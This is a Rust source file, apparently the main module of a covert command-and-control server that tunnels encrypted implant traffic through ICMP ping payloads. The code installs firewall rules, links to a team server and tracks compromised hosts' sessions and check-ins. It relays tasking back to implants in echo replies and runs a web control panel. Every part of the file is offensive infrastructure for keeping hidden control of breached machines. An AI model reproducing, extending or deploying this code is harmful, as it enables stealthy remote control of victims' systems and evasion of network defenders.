#![deny(clippy::all, clippy::pedantic)]
#![feature(slice_range)]
#![feature(never_type)]
mod environment;
mod nft;
mod patcher;
mod workers;
use anyhow::{bail, Result};
use clap::Parser;
use covert_c2_ping_common::{PingMessage, SessionData};
use covert_common::CovertChannel;
use lazy_static::lazy_static;
use nft::Rules;
use rand::Rng;
use std::{
    collections::HashMap,
    time::{Duration, SystemTime, UNIX_EPOCH},
};
use tokio::{
    select,
    signal::{self, unix::SignalKind},
    sync::{
        mpsc::{self, UnboundedSender},
        Mutex,
    },
    task,
};
use tracing::{Instrument, Level};
use workers::{ping, web};

#[derive(Parser)]
#[clap(author, version, about, long_about = None)]
struct Config {
    #[clap(long, value_parser, default_value_t=std::env::var("TEAM_SERVER").unwrap_or("localhost:2222".to_owned()))]
    ts: String,
    #[clap(name="interface", long="i", value_parser, default_value_t=String::from("eth0"))]
    i: String,
}

lazy_static! {
    static ref GLOBAL_CONF: Config = Config::parse();
    static ref KEY: [u8; 32] = {
        let mut key = [0u8; 32];
        rand::thread_rng().fill(&mut key);
        key
    };
    static ref CHANNEL: Mutex<CovertChannel<PingMessage, 4>> =
        Mutex::new(CovertChannel::<PingMessage, 4>::new(*KEY));
    static ref SESSIONS: Mutex<HashMap<u16, (UnboundedSender<()>, SessionData)>> =
        Mutex::new(HashMap::new());
}

fn main() -> Result<()> {
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()?;
    rt.block_on(entry())?;
    rt.shutdown_timeout(Duration::from_secs(1));
    tracing::info!("Shutdown complete");
    Ok(())
}

async fn entry() -> Result<()> {
    let conf = &(*GLOBAL_CONF);
    tracing_subscriber::fmt::init();
    tracing::info!("Control Panel on port 8080");
    tracing::info!(
        "Static Web Files: {:?}",
        environment::get_static_path().as_os_str()
    );
    tracing::info!(
        "Artifact Files: {:?}",
        environment::get_artifact_path().as_os_str()
    );
    tracing::info!("Team Server: {}", conf.ts);
    tracing::info!("Interface: {}", conf.i);
    tracing::info!("Key: {:02X?}", *KEY);
    tracing::info!("Starting...");

    let web_h = task::spawn(web::worker());
    let rules = Rules::new().or_else(|err| {
        tracing::info!("{:?}", err);
        bail!("Failed to make rules");
    })?;

    let sig_h = task::spawn(
        async move {
            let mut res =
                signal::unix::signal(SignalKind::interrupt()).expect("Couldn't wait on signal");
            res.recv().await;
            tracing::info!("Got SIGINT, starting shutdown");
        }
        .instrument(tracing::span!(Level::INFO, "signal_handle")),
    );

    let (downstream_sender, upstream_receiver, recv_h, send_h) = ping::start_workers()?;

    let main_h = task::spawn(main_loop(downstream_sender, upstream_receiver));

    select! {
        _ = web_h => {}
        _ = recv_h => {}
        _ = send_h => {}
        _ = sig_h => {}
        _ = main_h => {}
    }
    drop(rules);
    tracing::info!("Shutting down");
    Ok(())
}

#[tracing::instrument(skip_all)]
async fn main_loop(
    downstream_sender: mpsc::UnboundedSender<ping::Transaction>,
    mut upstream_receiver: mpsc::UnboundedReceiver<ping::Transaction>,
) -> Result<()> {
    loop {
        tracing::info!("Waiting for message");
        let incoming_ping = if let Some(ping) = upstream_receiver.recv().await {
            ping
        } else {
            tracing::info!("Upstream worker closed");
            break;
        };
        let channel_state = CHANNEL.lock().await.put_packet(&incoming_ping.data);
        let out_data: Vec<u8> = match channel_state {
            Ok((inc_chan, has_message)) => {
                let mut session_guard = SESSIONS.lock().await;
                let session = session_guard.get_mut(&inc_chan);
                if let Some((notify, session_data)) = session {
                    session_data.last_checkin = SystemTime::now()
                        .duration_since(UNIX_EPOCH)
                        .ok()
                        .map(|v| v.as_secs_f64() * 1_000.0_f64);
                    session_data.host = Some(incoming_ping.src_ip);
                    if has_message && notify.send(()).is_err() {
                        tracing::info!(channel = inc_chan, "channel closed");
                        session_guard.remove(&inc_chan);
                    }
                } else {
                    tracing::info!(channel = inc_chan, "not a valid channel");
                }
                drop(session_guard);

                let (in_num, out_num) = CHANNEL.lock().await.packets_in_queue(inc_chan);
                tracing::info!(
                    inbound_packets = in_num,
                    outbound_packets = out_num,
                    channel = inc_chan,
                    "channel status"
                );
                CHANNEL.lock().await.get_packet(inc_chan)
            }
            Err(e) => {
                match e {
                    covert_common::CovertError::DecryptionError => {
                        tracing::info!("Failed to decrypt packet");
                    }
                    covert_common::CovertError::InvalidHash => {
                        tracing::info!("Invalid hash in packet");
                    }
                    covert_common::CovertError::DeserializeError => {
                        tracing::info!("Failed to deserialize packets to message");
                    }
                }
                continue;
            }
        };

        let outgoing_ping = ping::Transaction {
            src_mac: incoming_ping.dst_mac,
            dst_mac: incoming_ping.src_mac,
            src_ip: incoming_ping.dst_ip,
            dst_ip: incoming_ping.src_ip,
            sequence_number: incoming_ping.sequence_number,
            identifier: incoming_ping.identifier,
            data: out_data,
        };
        if let Err(e) = downstream_sender.send(outgoing_ping) {
            tracing::info!(error=?e,"Downstream worker closed");
            break;
        };
    }
    Ok(())
}
